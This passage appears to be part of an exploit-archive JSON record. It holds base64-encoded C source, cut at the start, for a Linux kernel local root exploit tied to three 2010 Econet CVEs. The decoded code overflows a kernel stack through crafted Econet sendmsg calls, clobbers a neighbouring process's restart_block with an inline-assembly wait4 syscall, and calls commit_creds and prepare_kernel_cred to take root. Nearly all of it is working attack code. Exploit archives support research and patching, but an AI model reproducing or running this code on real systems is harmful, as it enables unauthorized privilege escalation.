2xlbiA9IDB4MDI0NjsNCg0KCS8qIGZvcmNlIGFib3J0IHZpYSBFRkFVTFQgKi8NCglmb3IgKGkgPSBTVEFDS19PRkZTRVQgKyAxOyBpIDwgSU9WUzsgKytpKSB7DQoJCWlvdnNbaV0uaW92X2Jhc2UgPSAodm9pZCAqKSAweGZmZmZmZmZmMDAwMDAwMDA7DQoJCWlvdnNbaV0uaW92X2xlbiA9IDA7DQoJfQ0KDQoJLyogY3JlYXRlIGVjb25ldCBzb2NrZXQgKi8NCgllY29fc29jayA9IHNvY2tldChQRl9FQ09ORVQsIFNPQ0tfREdSQU0sIDApOw0KCWlmIChlY29fc29jayA8IDApIHsNCgkJcHJpbnRmKCJbLV0gZmFpbGVkIGNyZWF0aW5nIGVjb25ldCBzb2NrZXQsIGFib3J0aW5nIVxuIik7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJbWVtc2V0KCZpZnIsIDAsIHNpemVvZihpZnIpKTsNCglzdHJjcHkoaWZyLmlmcl9uYW1lLCAibG8iKTsNCg0KCS8qIHRyaWNrIGVjb25ldCBpbnRvIGFzc29jaWF0ZWQgd2l0aCB0aGUgbG9vcGJhY2sgKi8NCglyZXQgPSBpb2N0bChlY29fc29jaywgU0lPQ1NJRkFERFIsICZpZnIpOw0KCWlmIChyZXQgIT0gMCkgew0KCQlwcmludGYoIlstXSBmYWlsZWQgc2V0dGluZyBpbnRlcmZhY2UgYWRkcmVzcywgYWJvcnRpbmchXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCgltZW1zZXQoJmVjb19hZGRyLCAwLCBzaXplb2YoZWNvX2FkZHIpKTsNCgltZW1zZXQoJmVjb19tc2csIDAsIHNpemVvZihlY29fbXNnKSk7DQoJZWNvX21zZy5tc2dfbmFtZSA9ICZlY29fYWRkcjsNCgllY29fbXNnLm1zZ19uYW1lbGVuID0gc2l6ZW9mKGVjb19hZGRyKTsNCgllY29fbXNnLm1zZ19mbGFncyA9IDA7DQoJZWNvX21zZy5tc2dfaW92ID0gJmlvdnNbMF07DQoJZWNvX21zZy5tc2dfaW92bGVuID0gSU9WUzsNCg0KCXByaW50ZigiWytdIHVwcGVyIGNoaWxkIHRyaWdnZXJpbmcgc3RhY2sgb3ZlcmZsb3cuLi5cbiIpOw0KDQoJLyogdHJpZ2dlciB0aGUga3N0YWNrIG92ZXJmbG93IGludG8gbG93ZXIgY2hpbGQncyBrc3RhY2sgKi8NCglyZXQgPSBzZW5kbXNnKGVjb19zb2NrLCAmZWNvX21zZywgMCk7DQoJaWYgKHJldCAhPSAtMSB8fCBlcnJubyAhPSBFRkFVTFQpIHsNCgkJcHJpbnRmKCJbLV0gc2VuZG1zZyBzdWNjZWVkZWQgdW5leHBlY3RlZGx5LCBhYm9ydGluZyFcbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCWNsb3NlKGVjb19zb2NrKTsNCn0NCg0Kdm9pZA0KZG9fY2hpbGRfbG93ZXIodm9pZCkNCnsNCglpbnQgcGlkOw0KDQoJcHJpbnRmKCJbK10gbG93ZXIgY2hpbGQgc3Bhd25pbmcgYSBoZWxwZXIuLi5cbiIpOw0KDQoJLyogZm9yayBvZmYgYSBoZWxwZXIgdG8gd2FpdDQgb24gKi8NCglwaWQgPSBmb3JrKCk7DQoJaWYgKHBpZCA9PSAwKSB7DQoJCXByaW50ZigiWytdIGhlbHBlciBnb2luZyB0byBzbGVlcC4uLlxuIik7DQoJCXNsZWVwKDUpOw0KCQlwcmludGYoIlsrXSBoZWxwZXIgd29rZSB1cFxuIik7DQoJCWV4aXQoMSk7DQoJfQ0KDQoJcHJpbnRmKCJbK10gbG93ZXIgY2hpbGQgY2FsbGluZyBjb21wYXRfc3lzX3dhaXQ0IG9uIGhlbHBlci4uLlxuIik7DQoNCgkvKiBzeXNjYWxsKE5SX1dBSVQ0LCBwaWQsIDAsIDAsIDApICovDQoJYXNtIHZvbGF0aWxlICgNCgkJInB1c2ggJSVyYXhcbiINCgkJInB1c2ggJSVyYnhcbiINCgkJInB1c2ggJSVyY3hcbiINCgkJInB1c2ggJSVyZHhcbiINCgkJInB1c2ggJSVyc2lcbiINCgkJIm1vdmwgJTAsICUlZWF4XG4iDQoJCSJtb3ZsICUxLCAlJWVieFxuIg0KCQkibW92bCAlMiwgJSVlY3hcbiINCgkJIm1vdmwgJTMsICUlZWR4XG4iDQoJCSJtb3ZsICU0LCAlJWVzaVxuIg0KCQkiaW50ICQweDgwXG4iDQoJCSJwb3AgJSVyc2lcbiINCgkJInBvcCAlJXJkeFxuIg0KCQkicG9wICUlcmN4XG4iDQoJCSJwb3AgJSVyYnhcbiINCgkJInBvcCAlJXJheFxuIg0KCQk6DQoJCTogInIiKE5SX1dBSVQ0KSwgInIiKHBpZCksICJyIigwKSwgInIiKDApLCAiciIoMCkNCgkJOiAibWVtb3J5IiwgInJheCIsICJyYngiLCAicmN4IiwgInJkeCIsICJyc2kiDQoJKTsNCg0KCXByaW50ZigiWytdIGxvd2VyIGNoaWxkIHJldHVybmVkIGZyb20gY29tcGF0X3N5c193YWl0NFxuIik7DQoNCglwcmludGYoIlsrXSBwYXJlbnQncyByZXN0YXJ0X2Jsb2NrIGhhcyBiZWVuIGNsb2JiZXJlZFxuIik7DQoNCgkvKiBzaWduYWwgcGFyZW50IHRoYXQgb3VyIGZwdHIgc2hvdWxkIG5vdyBiZSBjbG9iYmVyZWQgKi8NCglyZWdpb24tPnBhcmVudCA9IEtTVEFDS19DTE9CQkVSOw0KfQ0KDQppbnQNCm1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQ0Kew0KCWludCB0eXBlOw0KDQoJaWYgKHNpemVvZih1bnNpZ25lZCBsb25nKSAhPSA4KSB7DQoJCXByaW50ZigiWy1dIHg4Nl82NCBvbmx5LCBzb3JyeSFcbiIpOw0KCQlleGl0KDEpOw0KCX0NCg0KCXByaW50ZigiWytdIGxvb2tpbmcgZm9yIHN5bWJvbHMuLi5cbiIpOw0KIA0KCWNvbW1pdF9jcmVkcyA9IChfY29tbWl0X2NyZWRzKSBnZXRfc3ltYm9sKCJjb21taXRfY3JlZHMiKTsNCglpZiAoIWNvbW1pdF9jcmVkcykgew0KCQlwcmludGYoIlstXSBzeW1ib2wgdGFibGUgbm90IGF2YWlsYWJsZSwgYWJvcnRpbmchXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQogDQoJcHJlcGFyZV9rZXJuZWxfY3JlZCA9IChfcHJlcGFyZV9rZXJuZWxfY3JlZCkgZ2V0X3N5bWJvbCgicHJlcGFyZV9rZXJuZWxfY3JlZCIpOw0KCWlmICghcHJlcGFyZV9rZXJuZWxfY3JlZCkgew0KCQlwcmludGYoIlstXSBzeW1ib2wgdGFibGUgbm90IGF2YWlsYWJsZSwgYWJvcnRpbmchXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglpYTMyX3N5c3JldCA9IGdldF9zeW1ib2woImlhMzJfc3lzcmV0Iik7DQoJaWYgKCFpYTMyX3N5c3JldCkgew0KCQlwcmludGYoIlstXSBzeW1ib2wgdGFibGUgbm90IGF2YWlsYWJsZSwgYWJvcnRpbmchXG4iKTsNCgkJZXhpdCgxKTsNCgl9DQoNCglwcmludGYoIlsrXSBzcGF3bmluZyBjaGlsZHJlbiB0byBhY2hpZXZlIGFkamFjZW50IGtzdGFja3MuLi5cbiIpOw0KDQoJdHlwZSA9IGdldF9hZGphY2VudF9rc3RhY2tzKCk7DQoNCglpZiAodHlwZSA9PSBLU1RBQ0tfUEFSRU5UKSB7DQoJCWRvX3BhcmVudCgpOw0KCX0gZWxzZSBpZiAodHlwZSA9PSBLU1RBQ0tfVVBQRVIpIHsNCgkJZG9fY2hpbGRfdXBwZXIoKTsNCgl9IGVsc2UgaWYgKHR5cGUgPT0gS1NUQUNLX0xPV0VSKSB7DQoJCWRvX2NoaWxkX2xvd2VyKCk7DQoJfQ0KDQoJcmV0dXJuIDA7DQp9", 
    "filename": "platforms/linux/local/17787.c", 
    "id": "17787", 
    "cves": [
        "CVE-2010-3848", 
        "CVE-2010-3850", 
        "CVE-2010-4073"
    ]
}